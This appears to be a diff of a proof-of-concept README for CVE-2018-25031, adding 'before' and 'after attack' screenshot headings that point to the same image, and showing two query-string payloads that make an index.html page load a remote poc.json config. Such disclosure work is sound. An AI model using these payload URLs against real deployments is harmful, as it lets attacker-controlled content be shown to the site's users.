@@ -14,10 +14,15 @@
 </div>  
   
 <br/>   
+ 
+### Screenshot before attack:
+<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />
+
+### Screenshot after attack:
+<img src="https://afine.pl/wp-content/uploads/2017/06/afine2.png" align="center" style="width: 100%" />
 
 ### PoC:
 ```
 /index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
 /index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json
 ```
- 
